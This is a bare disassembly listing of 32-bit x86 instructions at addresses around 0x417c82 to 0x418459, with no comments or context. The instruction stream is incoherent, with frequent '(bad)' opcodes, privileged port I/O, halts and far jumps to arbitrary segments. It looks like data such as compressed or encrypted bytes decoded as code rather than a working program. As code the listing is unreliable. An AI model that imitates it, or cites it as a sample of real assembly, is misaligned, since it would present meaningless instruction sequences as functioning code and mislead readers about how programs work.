  417c82:	jb     0x417c3a
  417c84:	mov    ebx,0x7f802460
  417c89:	arpl   WORD PTR [ebx+0x41],bp
  417c8c:	inc    ecx
  417c8d:	out    0xa0,eax
  417c8f:	js     0x417cbb
  417c91:	pop    edx
  417c92:	cs cmp eax,0xc56be740
  417c98:	or     ebp,DWORD PTR [edx+0x43]
  417c9b:	push   ds
  417c9c:	aad    0x66
  417c9e:	sub    DWORD PTR [ecx-0x390a3fb],edi
  417ca4:	and    eax,DWORD PTR [eax+0x56aa9106]
  417caa:	dec    ecx
  417cab:	xor    BYTE PTR [esp+ebx*1],0xde
  417caf:	out    dx,al
  417cb0:	call   FWORD PTR [edi-0x469574e7]
  417cb6:	and    eax,0x87ef8dcf
  417cbb:	push   ds
  417cbc:	dec    eax
  417cbd:	js     0x417d26
  417cbf:	xlat   BYTE PTR ds:[ebx]
  417cc0:	sbb    ebx,DWORD PTR [esi+0x6]
  417cc3:	add    DWORD PTR [ecx],ecx
  417cc5:	clc    
  417cc6:	sbb    DWORD PTR [edi-0x60],ebp
  417cc9:	fwait
  417cca:	xchg   edi,eax
  417ccb:	dec    ebx
  417ccc:	and    eax,0x6d194755
  417cd1:	mov    BYTE PTR [edx+0x48038bfb],dh
  417cd7:	mov    BYTE PTR [eax+eax*8],bl
  417cda:	mov    dl,BYTE PTR [eax+0x1b1af6b5]
  417ce0:	fistp  DWORD PTR [esi]
  417ce2:	(bad)  
  417ce3:	dec    ebp
  417ce4:	nop    eax
  417ce7:	cmc    
  417ce8:	cmc    
  417ce9:	pop    ds
  417cea:	sub    bl,BYTE PTR [ebx-0x49cd11cc]
  417cf0:	dec    ecx
  417cf1:	and    edx,esp
  417cf3:	jb     0x417d2a
  417cf5:	mov    bl,0xf9
  417cf7:	inc    esi
  417cf8:	adc    BYTE PTR [ebp+0x20],0x43
  417cfc:	mov    ss,esp
  417cfe:	fwait
  417cff:	cli    
  417d00:	sbb    BYTE PTR [edx],dh
  417d02:	and    BYTE PTR [ecx-0x4600b862],al
  417d08:	xlat   BYTE PTR ds:[ebx]
  417d09:	jne    0x417c8e
  417d0b:	cmp    eax,DWORD PTR [edx-0x11]
  417d0e:	cli    
  417d0f:	aad    0x93
  417d11:	adc    eax,0x9cd447a4
  417d16:	(bad)  
  417d17:	ror    ah,cl
  417d19:	dec    ebp
  417d1a:	mov    ?,WORD PTR [eax]
  417d1c:	sub    eax,DWORD PTR [esi]
  417d1e:	inc    ecx
  417d1f:	lods   al,BYTE PTR ds:[esi]
  417d20:	ror    BYTE PTR [esp+ebx*8-0x53],0x31
  417d25:	fnstenv ds:0x9975809e
  417d2b:	dec    ecx
  417d2c:	sbb    edi,esp
  417d2e:	call   0x4a00:0xd2db45f4
  417d35:	fild   DWORD PTR [edx]
  417d37:	mov    WORD PTR [ebx],cs
  417d39:	push   esp
  417d3a:	push   cs
  417d3b:	(bad)  
  417d3c:	test   al,0x2
  417d3e:	aaa    
  417d3f:	into   
  417d40:	in     eax,0xe1
  417d42:	bound  ecx,QWORD PTR [edx]
  417d44:	scas   eax,DWORD PTR es:[edi]
  417d45:	imul   ebp,DWORD PTR [eax+0x57],0xdba3378b
  417d4c:	in     eax,0x2a
  417d4e:	xchg   esp,eax
  417d4f:	adc    al,0xc2
  417d51:	icebp  
  417d52:	inc    edi
  417d53:	rol    al,1
  417d55:	add    BYTE PTR [ebx],ch
  417d57:	pusha  
  417d58:	mov    esi,0xf8b8bc87
  417d5d:	mov    esi,0x857e06dc
  417d62:	imul   ebx,DWORD PTR [edx+0x31f2168f],0x2bb9821c
  417d6c:	aam    0x84
  417d6e:	es stos BYTE PTR es:[edi],al
  417d70:	sbb    BYTE PTR [ecx+esi*1+0x3aa123b],bl
  417d77:	(bad)  
  417d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d79:	xchg   esp,eax
  417d7a:	and    DWORD PTR ds:0x86283ddb,0x8d91895b
  417d84:	xor    al,0xa7
  417d86:	jge    0x417d6f
  417d88:	xchg   BYTE PTR [esi-0x4a8aa4f5],bl
  417d8e:	(bad)  
  417d8f:	push   esi
  417d90:	(bad)  
  417d91:	mov    BYTE PTR [esp+edi*4+0x23],dh
  417d95:	test   al,0x88
  417d97:	ret    
  417d98:	mov    bl,0xe8
  417d9a:	pusha  
  417d9b:	lods   al,BYTE PTR ds:[esi]
  417d9c:	add    BYTE PTR [eax+edi*1],ah
  417d9f:	jg     0x417dae
  417da1:	pop    edi
  417da2:	and    ch,BYTE PTR [edx+eiz*8]
  417da5:	sti    
  417da6:	test   eax,0x4022f0d2
  417dab:	(bad)  
  417dac:	int3   
  417dad:	pop    esp
  417dae:	xor    al,0x3a
  417db0:	retf   0x41fd
  417db3:	fist   WORD PTR [edx]
  417db5:	mov    ah,0x6b
  417db7:	cs inc esi
  417db9:	mov    ebp,0xa83ba49c
  417dbe:	push   cs
  417dbf:	cs in  al,0x6f
  417dc2:	rol    BYTE PTR [ebp+0x126c26bf],1
  417dc8:	or     BYTE PTR [eax],al
  417dca:	and    eax,0xeef71599
  417dcf:	mov    ebx,DWORD PTR [eax-0x61]
  417dd2:	ja     0x417d74
  417dd4:	push   eax
  417dd5:	(bad)  [edi+0x16316519]
  417ddb:	add    DWORD PTR [edi],esp
  417ddd:	mov    ch,BYTE PTR [esi-0x6c784159]
  417de3:	mov    ebp,0x9659e307
  417de8:	jne    0x417dc3
  417dea:	inc    edx
  417deb:	sub    eax,0x3a1c208c
  417df0:	das    
  417df1:	pop    esi
  417df2:	test   al,0x31
  417df4:	or     dh,bl
  417df6:	or     al,0xef
  417df8:	or     bh,BYTE PTR ds:0x32128110
  417dfe:	out    0x86,eax
  417e00:	sar    DWORD PTR [ecx-0x59ff10cd],1
  417e06:	sbb    ah,0x7e
  417e09:	pop    eax
  417e0a:	mov    ebx,0xdbb090c3
  417e0f:	outs   dx,DWORD PTR ds:[esi]
  417e10:	out    dx,al
  417e11:	and    al,0x47
  417e13:	cdq    
  417e14:	shl    DWORD PTR [ecx+ebx*2+0x64e4654c],cl
  417e1b:	std    
  417e1c:	xchg   edx,eax
  417e1d:	aaa    
  417e1e:	or     esi,edx
  417e20:	fnstsw WORD PTR [edi+0x12]
  417e23:	inc    ebp
  417e24:	and    ch,ah
  417e26:	dec    bl
  417e28:	push   ebp
  417e29:	lea    ebp,[ebx-0x5618e7f2]
  417e2f:	xchg   edi,eax
  417e30:	jns    0x417ea9
  417e32:	mov    BYTE PTR [esi-0x5c],dh
  417e35:	adc    eax,0x3d84bf04
  417e3a:	jl     0x417e77
  417e3c:	mov    bl,ch
  417e3e:	fwait
  417e3f:	mov    bl,0xf1
  417e41:	lock xchg esi,eax
  417e43:	shr    ch,1
  417e45:	sbb    ebx,DWORD PTR [ebx-0x1f6e6d93]
  417e4b:	jmp    0x1ec40119
  417e50:	div    DWORD PTR [esi]
  417e52:	hlt    
  417e53:	cs out dx,al
  417e55:	out    dx,eax
  417e56:	mov    ebx,0x5ac4d73c
  417e5b:	sbb    BYTE PTR ds:0x9dbc746c,bh
  417e61:	inc    ebx
  417e62:	enter  0x62f3,0x6a
  417e66:	cmp    ebp,esp
  417e68:	or     dh,BYTE PTR [ebx+ecx*4-0x1e]
  417e6c:	or     ebx,0x43534744
  417e72:	iret   
  417e73:	mov    cl,0xd6
  417e75:	cld    
  417e76:	inc    ebx
  417e77:	ffree  st(6)
  417e79:	mov    ds:0xcb786a1a,al
  417e7e:	and    ah,dl
  417e80:	inc    ebp
  417e81:	cmp    al,0xbc
  417e83:	pop    ebp
  417e84:	pop    es
  417e85:	popa   
  417e86:	mov    ebx,ecx
  417e88:	xchg   ebx,eax
  417e89:	in     al,0xc6
  417e8b:	jge    0x417e55
  417e8d:	std    
  417e8e:	xlat   BYTE PTR ds:[ebx]
  417e8f:	or     ebx,DWORD PTR [edx-0x57]
  417e92:	ror    ah,cl
  417e94:	fild   WORD PTR [ecx+0x7]
  417e97:	nop
  417e98:	xchg   DWORD PTR [esi-0x2c],ecx
  417e9b:	inc    ebp
  417e9c:	adc    BYTE PTR [edi],bh
  417e9e:	mov    WORD PTR [ecx+0x65b4ab2c],fs
  417ea4:	jae    0x417e80
  417ea6:	pop    ecx
  417ea7:	outs   dx,BYTE PTR ds:[esi]
  417ea8:	push   esi
  417ea9:	sbb    dl,BYTE PTR [eax-0x392c3b50]
  417eaf:	sbb    edi,edi
  417eb1:	popa   
  417eb2:	and    eax,ebx
  417eb4:	shl    DWORD PTR [ecx-0xf],0x1d
  417eb8:	lahf   
  417eb9:	(bad)  
  417eba:	pop    edx
  417ebb:	push   cs
  417ebc:	sub    al,0x94
  417ebe:	jg     0x417eb7
  417ec0:	icebp  
  417ec1:	in     al,dx
  417ec2:	icebp  
  417ec3:	(bad)  
  417ec4:	outs   dx,BYTE PTR ds:[esi]
  417ec5:	lock jae 0x417e79
  417ec8:	jb     0x417e7d
  417eca:	jmp    0x28a5:0xba663bcb
  417ed1:	pop    esi
  417ed2:	(bad)  
  417ed3:	lahf   
  417ed4:	mov    edi,0x4702b439
  417ed9:	pop    DWORD PTR [edx-0x1a]
  417edc:	jb     0x417ef2
  417ede:	sti    
  417edf:	mov    ds:0xf6481ceb,al
  417ee4:	mov    ch,0x91
  417ee6:	adc    bh,BYTE PTR [eax+edx*1]
  417ee9:	test   eax,0xf7f7a39a
  417eee:	mov    BYTE PTR ss:[ecx+0x7e0342f],ch
  417ef5:	pop    es
  417ef6:	repnz inc ecx
  417ef8:	add    BYTE PTR [esi-0x7c],bh
  417efb:	iret   
  417efc:	enter  0x2974,0xeb
  417f00:	mov    DWORD PTR [edx+0x5a],edi
  417f03:	aas    
  417f04:	fwait
  417f05:	lahf   
  417f06:	add    esp,DWORD PTR [esi+0x5e]
  417f09:	mov    ch,BYTE PTR [edx-0x22]
  417f0c:	pop    eax
  417f0d:	lods   eax,DWORD PTR ds:[esi]
  417f0e:	int3   
  417f0f:	imul   edi,DWORD PTR [edx+eiz*1+0x17c47a26],0x2f
  417f17:	adc    DWORD PTR [edx+0x58],eax
  417f1a:	repz mov ecx,0xf674088d
  417f20:	test   BYTE PTR [eax],0x9b
  417f23:	(bad)  
  417f24:	sti    
  417f25:	mov    ebp,0xf9dc4556
  417f2a:	add    DWORD PTR [esi-0x6b021b3f],ecx
  417f30:	aas    
  417f31:	push   edx
  417f32:	leave  
  417f33:	stos   BYTE PTR es:[edi],al
  417f34:	js     0x417f4a
  417f36:	jne    0x417f12
  417f38:	adc    ch,BYTE PTR [ebp+0x33e382f2]
  417f3e:	popa   
  417f3f:	mov    eax,ds:0x554b33bd
  417f44:	loop   0x417f92
  417f46:	retf   
  417f47:	or     ch,BYTE PTR [ebx+0x6a]
  417f4a:	sbb    DWORD PTR [ebx],eax
  417f4c:	xlat   BYTE PTR ds:[ebx]
  417f4d:	outs   dx,BYTE PTR ds:[esi]
  417f4e:	pusha  
  417f4f:	cmc    
  417f50:	dec    esi
  417f51:	sub    ebp,DWORD PTR [ecx+0x63]
  417f54:	mov    ah,0x2
  417f56:	stos   BYTE PTR es:[edi],al
  417f57:	(bad)  
  417f58:	lock popa 
  417f5a:	mov    ecx,0x1732f9d
  417f5f:	mov    ebx,0xb2745a93
  417f64:	daa    
  417f65:	icebp  
  417f66:	cmp    al,0xfa
  417f68:	das    
  417f69:	fs pop ss
  417f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f6c:	add    DWORD PTR [edx+edx*8-0x1b],esp
  417f70:	out    dx,eax
  417f71:	adc    eax,0xf21cff84
  417f76:	mov    esi,0xde28dfd1
  417f7b:	xor    al,BYTE PTR es:[ecx-0x3b157835]
  417f82:	arpl   WORD PTR [ecx],ax
  417f84:	or     esi,edx
  417f86:	dec    esp
  417f87:	add    eax,0x9a68084e
  417f8c:	mov    bl,0xf2
  417f8e:	xlat   BYTE PTR ds:[ebx]
  417f8f:	outs   dx,DWORD PTR ds:[esi]
  417f90:	shl    DWORD PTR [ecx],1
  417f92:	pop    ebx
  417f93:	cs dec edi
  417f95:	mov    eax,ds:0xf94b8691
  417f9a:	jns    0x418005
  417f9c:	inc    eax
  417f9d:	fld    TBYTE PTR [ebp+eax*2-0x150e4879]
  417fa4:	mov    eax,ds:0x83de5a2f
  417fa9:	push   edi
  417faa:	mov    bl,0x5f
  417fac:	inc    edi
  417fad:	xor    ah,BYTE PTR [ebp-0x6e]
  417fb0:	xchg   BYTE PTR [ebx-0x6bda84c1],dh
  417fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb7:	clc    
  417fb8:	mov    ds:0xdfed946a,al
  417fbd:	or     ebx,DWORD PTR [ebp-0xe]
  417fc0:	pop    ebx
  417fc1:	lds    ebx,FWORD PTR [ecx+edx*2+0x200325db]
  417fc8:	xor    eax,DWORD PTR [eax]
  417fca:	fs inc edx
  417fcc:	adc    al,0x54
  417fce:	pop    ss
  417fcf:	sbb    ecx,DWORD PTR [ebx]
  417fd1:	fldcw  WORD PTR ds:0xbaa97af5
  417fd7:	shl    BYTE PTR [esi],0x9f
  417fda:	hlt    
  417fdb:	addr16 cdq 
  417fdd:	repnz lods eax,DWORD PTR ds:[esi]
  417fdf:	jp     0x417fa9
  417fe1:	jmp    0x8e43:0x897ccbbe
  417fe8:	add    dh,BYTE PTR [ebp+0x32]
  417feb:	inc    edi
  417fec:	cli    
  417fed:	or     BYTE PTR ds:0xd035be1,ch
  417ff3:	jnp    0x418023
  417ff5:	xchg   ecx,eax
  417ff6:	sub    edx,DWORD PTR es:[ecx+0xa010d24]
  417ffd:	jg     0x418078
  417fff:	rol    ecx,cl
  418001:	xor    DWORD PTR ds:0xcc823453,esp
  418007:	ror    esi,0x76
  41800a:	bound  edx,QWORD PTR [edi]
  41800c:	push   edi
  41800d:	jne    0x41802f
  41800f:	pop    eax
  418010:	es mov ch,BYTE PTR fs:[eax+0x5be3ffe3]
  418018:	imul   ecx,edi,0xfb357009
  41801e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41801f:	stc    
  418020:	jb     0x418061
  418022:	vpunpcklbw xmm5,xmm6,XMMWORD PTR [eax+ebp*2-0x43d8621d]
  41802b:	test   dh,al
  41802d:	hlt    
  41802e:	pop    eax
  41802f:	mov    ecx,0x52ff6e9a
  418034:	dec    eax
  418035:	test   DWORD PTR [eax],esi
  418037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418038:	jmp    0x6eca:0x96763d55
  41803f:	jb     0x418029
  418041:	and    al,0x60
  418043:	xor    DWORD PTR [eax-0x3f],ecx
  418046:	clc    
  418047:	nop
  418048:	mov    dh,0x9a
  41804a:	sub    esi,DWORD PTR [ebp-0x6ab4bd30]
  418050:	pop    ebx
  418051:	push   ds
  418052:	push   0x5592546a
  418057:	(bad)  
  418058:	cwde   
  418059:	iret   
  41805a:	sbb    esp,DWORD PTR [edi+0x2d]
  41805d:	jae    0x41808a
  41805f:	push   ds
  418060:	lea    edx,[eax]
  418062:	test   DWORD PTR [ebp+0x365fb71],edx
  418068:	loopne 0x41800a
  41806a:	test   bl,0x3d
  41806d:	outs   dx,BYTE PTR ds:[esi]
  41806e:	cmp    ch,BYTE PTR [edx-0x32]
  418071:	les    ebx,FWORD PTR [ecx-0x11]
  418074:	dec    ebp
  418075:	fstp   TBYTE PTR [esi+0x5b5a47ec]
  41807b:	mov    WORD PTR [edx-0x6f],?
  41807e:	mov    WORD PTR [edx-0x8],fs
  418081:	dec    edi
  418082:	in     eax,0x44
  418084:	dec    ebp
  418085:	push   0xd5493903
  41808a:	xor    dl,bl
  41808c:	data16 adc ch,BYTE PTR [esi-0x7c]
  418090:	sub    eax,0x6d56d33f
  418095:	sub    dh,BYTE PTR [edi]
  418097:	jb     0x418112
  418099:	xchg   BYTE PTR [edi-0x5e26fb44],bl
  41809f:	retf   
  4180a0:	dec    BYTE PTR [edx]
  4180a2:	in     al,0x26
  4180a4:	into   
  4180a5:	jecxz  0x418097
  4180a7:	sbb    al,0x5b
  4180a9:	xchg   edi,eax
  4180aa:	rcr    BYTE PTR [eax+0x5029243a],0x16
  4180b1:	test   DWORD PTR [ecx-0x60e2fd34],ebx
  4180b7:	inc    esi
  4180b8:	jmp    0x41805e
  4180ba:	xor    al,0x70
  4180bc:	and    dl,BYTE PTR [ebx-0xa]
  4180bf:	int    0x81
  4180c1:	ins    DWORD PTR es:[edi],dx
  4180c2:	xchg   BYTE PTR [edx+0x3a],ch
  4180c5:	adc    eax,0xf2dc4b87
  4180ca:	jnp    0x41810a
  4180cc:	or     BYTE PTR [esi-0x10f50eb5],dl
  4180d2:	nop
  4180d3:	cwde   
  4180d4:	clc    
  4180d5:	imul   esi,edx,0x8b17574
  4180db:	push   ebp
  4180dc:	jl     0x4180b7
  4180de:	cmp    ebx,0x1e69f88c
  4180e4:	sbb    BYTE PTR [ecx+0x18],bh
  4180e7:	retf   
  4180e8:	aas    
  4180e9:	mov    edi,0xfdcb3008
  4180ee:	sub    al,ch
  4180f0:	js     0x4180e8
  4180f2:	or     bh,BYTE PTR [ebp+0xb]
  4180f5:	xchg   esi,eax
  4180f6:	cmp    eax,0xecef78d9
  4180fb:	mov    al,0xbd
  4180fd:	mov    ds:0xf0c33b04,al
  418102:	jmp    0xdac3:0x22051132
  418109:	add    al,0x72
  41810b:	in     al,dx
  41810c:	and    dh,BYTE PTR [edx]
  41810e:	or     ebx,DWORD PTR [edi]
  418110:	xchg   edx,eax
  418111:	or     BYTE PTR [ecx],dh
  418113:	jne    0x418181
  418115:	jo     0x41816c
  418117:	pop    ebp
  418118:	mov    ebx,DWORD PTR [edi+0x60]
  41811b:	jge    0x418121
  41811d:	sbb    al,0x52
  41811f:	aas    
  418120:	sub    BYTE PTR [ebx-0x4f],al
  418123:	push   ds
  418124:	lock cmp eax,0xba4ff31b
  41812a:	loop   0x4180ec
  41812c:	pop    esp
  41812d:	pop    edi
  41812e:	fs aaa 
  418130:	add    eax,0x7ef32d33
  418135:	mov    edi,0xcb7076d3
  41813a:	xchg   esi,eax
  41813b:	mov    ebx,0xfcb8a790
  418140:	jno    0x418194
  418142:	repz sbb BYTE PTR ds:0xb0c0f03c,al
  418149:	aad    0x61
  41814b:	mov    ebp,0x4180907c
  418150:	pop    esp
  418151:	(bad)  
  418152:	test   DWORD PTR [ebp-0x769bc64d],0xfb32e384
  41815c:	pop    edi
  41815d:	clc    
  41815e:	xchg   DWORD PTR [ebx-0x72661966],esp
  418164:	out    0xb,al
  418166:	or     eax,0x41b43de9
  41816b:	int    0x52
  41816d:	ss mov edi,0x3b49c37c
  418173:	imul   ebx,DWORD PTR [ecx-0x74],0x71
  418177:	std    
  418178:	push   es
  418179:	enter  0x51fd,0xd
  41817d:	mov    dl,0x62
  41817f:	xchg   ecx,eax
  418180:	lea    eax,[edi-0x6f869b31]
  418186:	dec    edx
  418187:	xchg   edx,eax
  418188:	and    eax,eax
  41818a:	popf   
  41818b:	sbb    DWORD PTR [esp+esi*8-0x106a43c],ebx
  418192:	inc    edi
  418193:	xor    bl,BYTE PTR [edi-0x470ef3f6]
  418199:	and    ah,BYTE PTR [edx+0x33]
  41819c:	inc    ebp
  41819d:	pop    eax
  41819e:	stc    
  41819f:	rcl    BYTE PTR [edi],1
  4181a1:	fwait
  4181a2:	mov    esp,edx
  4181a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a5:	dec    edi
  4181a6:	int3   
  4181a7:	pop    esp
  4181a8:	addr16 ss jnp 0x41819d
  4181ac:	xor    edi,ecx
  4181ae:	(bad)  
  4181b0:	in     eax,0x8f
  4181b2:	out    0x53,al
  4181b4:	sub    dl,BYTE PTR [edx+edx*1+0x749874a1]
  4181bb:	sbb    al,0xdf
  4181bd:	test   al,0x91
  4181bf:	sbb    bh,bl
  4181c1:	loope  0x41814a
  4181c3:	inc    ebx
  4181c4:	sub    cl,BYTE PTR [esi-0x38d1655c]
  4181ca:	sub    BYTE PTR [ebx+0xe07647d],ah
  4181d0:	lock cmp ebx,esi
  4181d3:	or     al,0xb8
  4181d5:	call   0x2432:0x1bc87fc2
  4181dc:	shl    BYTE PTR [edi-0x23],1
  4181df:	and    DWORD PTR [ecx+eiz*2],ecx
  4181e2:	pop    ds
  4181e3:	push   edx
  4181e4:	test   eax,0x65d32689
  4181e9:	xchg   DWORD PTR [esi+esi*2-0x2c],ebx
  4181ed:	ret    0xaa6e
  4181f0:	test   eax,0xb8990fd9
  4181f5:	or     eax,0x4169486
  4181fa:	inc    edx
  4181fb:	cmp    al,0x56
  4181fd:	and    DWORD PTR [ebx+0xa],esp
  418200:	(bad)  
  418201:	retf   
  418202:	push   0xffffffbe
  418204:	clc    
  418205:	or     al,0xfe
  418207:	push   eax
  418208:	and    al,0x1a
  41820a:	cmp    ebx,DWORD PTR [esi+eiz*2]
  41820d:	in     al,dx
  41820e:	jp     0x418280
  418210:	mov    ecx,DWORD PTR [edx-0x21b57830]
  418216:	fsub   DWORD PTR [esp+esi*8+0x306824e]
  41821d:	dec    ecx
  41821e:	ret    0x992e
  418221:	xchg   esp,eax
  418222:	ins    DWORD PTR es:[edi],dx
  418223:	jns    0x418239
  418225:	lods   eax,DWORD PTR ds:[esi]
  418226:	cmp    DWORD PTR ss:[edi+0x10],edi
  41822a:	cmp    eax,0x2a29945c
  41822f:	in     eax,0x1a
  418231:	cmp    esi,DWORD PTR [ecx]
  418233:	out    0x69,eax
  418235:	cld    
  418236:	shr    DWORD PTR [eax],0xfa
  418239:	js     0x4182a2
  41823b:	pop    ds
  41823c:	sbb    BYTE PTR [ebx],ah
  41823e:	and    al,bh
  418240:	dec    edi
  418241:	push   ebp
  418242:	push   esp
  418243:	stos   BYTE PTR es:[edi],al
  418244:	adc    DWORD PTR [ecx],esp
  418246:	je     0x418234
  418248:	xchg   edx,eax
  418249:	cmp    dl,BYTE PTR [edx+0x2f689781]
  41824f:	or     DWORD PTR [eax+0x7],ecx
  418252:	(bad)  
  418253:	fcom   DWORD PTR [ecx-0x28]
  418256:	imul   ebx,DWORD PTR [eax+0x338ffa81],0xc58d55bb
  418260:	xor    BYTE PTR ss:[ebx+esi*1+0x2d921001],bh
  418268:	or     al,0xe0
  41826a:	lahf   
  41826b:	out    0x33,al
  41826d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41826e:	inc    ebp
  41826f:	cdq    
  418270:	and    eax,0x2f284f81
  418275:	cmp    bh,BYTE PTR [eax+0x23]
  418278:	scas   al,BYTE PTR es:[edi]
  418279:	frstor [esi-0x777f0517]
  41827f:	and    eax,edx
  418281:	neg    BYTE PTR [eax+0x7a]
  418284:	aam    0x36
  418286:	xor    edi,ebx
  418288:	hlt    
  418289:	inc    ebx
  41828a:	fwait
  41828b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41828c:	loop   0x4182f1
  41828e:	push   esi
  41828f:	xchg   ebp,eax
  418290:	aas    
  418291:	shr    edx,1
  418293:	jae    0x418271
  418295:	add    cl,BYTE PTR [ecx]
  418297:	xchg   esi,eax
  418298:	pop    ebp
  418299:	add    BYTE PTR [esi-0x4f],dl
  41829c:	mov    ch,BYTE PTR [ecx+0x3c]
  41829f:	and    eax,0xac0b7d67
  4182a4:	shl    BYTE PTR [ebx-0x52],cl
  4182a7:	fcomp  DWORD PTR [esi+0x592b00a3]
  4182ad:	rcr    BYTE PTR [ebx+0x13594951],1
  4182b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182b4:	mov    dl,0x7a
  4182b6:	sub    bh,dl
  4182b8:	jbe    0x41826d
  4182ba:	retf   
  4182bb:	loop   0x41830b
  4182bd:	pop    ebp
  4182be:	and    DWORD PTR ds:0xe8a355f,esi
  4182c4:	push   ebp
  4182c5:	push   ebx
  4182c6:	dec    esp
  4182c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182c8:	mov    ch,al
  4182ca:	sti    
  4182cb:	push   0x2
  4182cd:	push   0x30b1089c
  4182d2:	cmp    DWORD PTR [ebx+0x41],esp
  4182d5:	fwait
  4182d6:	adc    eax,0x33c9b1fd
  4182db:	sub    al,0xad
  4182dd:	or     edi,DWORD PTR [edi+ebp*1-0x75]
  4182e1:	push   0xffffff96
  4182e3:	les    edi,FWORD PTR ds:0xccb0a2a1
  4182e9:	lock ss inc edx
  4182ec:	outs   dx,BYTE PTR ds:[esi]
  4182ed:	frstor [edi-0x3e94501e]
  4182f3:	mov    es,WORD PTR [esi*8+0x736be82b]
  4182fa:	das    
  4182fb:	(bad)  
  4182fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182fd:	add    BYTE PTR [edi+0x6c1d8e24],0xcb
  418304:	or     al,0x90
  418306:	lahf   
  418307:	out    dx,al
  418308:	arpl   WORD PTR [eax-0xbff62c6],si
  41830e:	xor    ch,dh
  418310:	bswap  esi
  418312:	mov    DWORD PTR [edi],ebx
  418314:	iret   
  418315:	add    edi,DWORD PTR [ecx]
  418317:	aam    0xf5
  418319:	(bad)  
  41831a:	iret   
  41831b:	and    BYTE PTR [ebp-0x62],dl
  41831e:	cmp    al,0xc
  418320:	popf   
  418321:	mov    al,ds:0xb4117d6a
  418326:	push   ecx
  418327:	and    eax,0x69f6fb67
  41832c:	add    al,0x30
  41832e:	and    DWORD PTR [ecx+edx*2-0x1d],esp
  418332:	add    ebp,DWORD PTR [edx+0x60a4f056]
  418338:	and    edi,DWORD PTR [edx-0x69]
  41833b:	jl     0x418372
  41833d:	fwait
  41833e:	jp     0x41839d
  418340:	jnp    0x4183b3
  418342:	fidiv  DWORD PTR [ecx+0x9865635]
  418348:	or     DWORD PTR [esi],esi
  41834a:	lock outs dx,BYTE PTR ds:[esi]
  41834c:	in     al,0xf0
  41834e:	pop    es
  41834f:	fldenv ds:0x6751e01d
  418355:	shr    BYTE PTR [edi-0x69],cl
  418358:	mov    BYTE PTR [esi],cl
  41835a:	or     bl,ch
  41835c:	dec    esp
  41835d:	ficom  WORD PTR [eax]
  41835f:	int3   
  418360:	mov    ds:0x6748c438,al
  418365:	push   edi
  418366:	enter  0x25b2,0x5f
  41836a:	fidiv  DWORD PTR gs:[ebx-0xd]
  41836e:	xchg   ecx,eax
  41836f:	fld    QWORD PTR [edx+0x312a4f0c]
  418375:	fs aaa 
  418377:	lds    ebp,FWORD PTR [esi+0x57]
  41837a:	pop    edi
  41837b:	test   ch,dh
  41837d:	enter  0x8ecb,0xd8
  418381:	pop    ss
  418382:	pushf  
  418383:	or     bh,BYTE PTR [edi-0x535f4b1a]
  418389:	xchg   ecx,eax
  41838a:	jle    0x41832f
  41838c:	cld    
  41838d:	dec    ecx
  41838e:	sub    edi,ebp
  418390:	ret    
  418391:	push   0xfffffff4
  418393:	int    0x8f
  418395:	lea    edi,[edi]
  418397:	dec    esp
  418398:	in     al,dx
  418399:	imul   BYTE PTR [esi-0x37]
  41839c:	mov    ecx,0x7fe1cbf5
  4183a1:	and    eax,0x8282c64
  4183a6:	xor    cl,BYTE PTR [edx+edx*4+0x8]
  4183aa:	jge    0x4183d8
  4183ac:	retf   
  4183ad:	or     DWORD PTR [ebx-0x46b23429],edi
  4183b3:	xchg   ebp,eax
  4183b4:	fldenv [ebp+0x7f]
  4183b7:	enter  0xd5f8,0x73
  4183bb:	inc    edi
  4183bc:	dec    eax
  4183bd:	jo     0x418392
  4183bf:	jns    0x41841e
  4183c1:	and    al,0x44
  4183c3:	shr    BYTE PTR [esi],0x53
  4183c6:	(bad)  
  4183c7:	retf   0x719b
  4183ca:	stc    
  4183cb:	and    ch,BYTE PTR ds:[edx]
  4183ce:	aad    0xc8
  4183d0:	repz (bad) 
  4183d2:	daa    
  4183d3:	pop    ecx
  4183d4:	add    BYTE PTR [ebx+ebp*1-0x5],bl
  4183d8:	scas   al,BYTE PTR es:[edi]
  4183d9:	dec    eax
  4183da:	xor    esp,DWORD PTR [ebp-0x1015bf97]
  4183e0:	push   ecx
  4183e1:	mov    ch,0x67
  4183e3:	adc    al,0x12
  4183e5:	mov    bl,0x77
  4183e7:	sbb    DWORD PTR [edx],eax
  4183e9:	mov    bh,0x7f
  4183eb:	out    dx,eax
  4183ec:	or     DWORD PTR [ebp-0x28f39e],0x6994f609
  4183f6:	inc    ebp
  4183f7:	jmp    0xc255dcde
  4183fc:	aam    0x2b
  4183fe:	scas   al,BYTE PTR es:[edi]
  4183ff:	in     eax,dx
  418400:	cmp    DWORD PTR [esi-0x46a075b3],ebx
  418406:	pushf  
  418407:	adc    eax,0xc5f93a
  41840c:	sub    BYTE PTR [esi],al
  41840e:	scas   eax,DWORD PTR es:[edi]
  41840f:	shl    esi,cl
  418411:	dec    edi
  418412:	push   ebp
  418413:	jg     0x418459
  418415:	imul   ebp,DWORD PTR [ebx+edx*1-0x52],0xffffff95
  41841a:	dec    edi
  41841b:	daa    
  41841c:	aaa    
  41841d:	pusha  
  41841e:	pop    es
  41841f:	push   ds
  418420:	test   eax,0x7ba0810d
  418425:	into   
  418426:	jnp    0x418438
  418428:	(bad)
  41842c:	mov    al,0x29
  41842e:	push   0x88d02b4a
  418433:	dec    edx
  418434:	mov    eax,ecx
  418436:	fisttp DWORD PTR [eax-0x4c]
  418439:	cmp    DWORD PTR [ebx],esi
  41843b:	scas   al,BYTE PTR es:[edi]
  41843c:	gs pop ecx
  41843e:	in     al,dx
  41843f:	mov    BYTE PTR [ecx],ah
  418441:	mov    edx,DWORD PTR [esi+edx*8]
  418444:	fiadd  DWORD PTR [esi]
  418446:	bound  ebx,QWORD PTR [esi-0x10eac473]
  41844c:	adc    eax,0xdabcd79c
  418451:	(bad)  
  418453:	jp     0x41847e
  418455:	push   cs
  418456:	sub    ch,BYTE PTR [ebx-0x37]
  418459:	aaa    
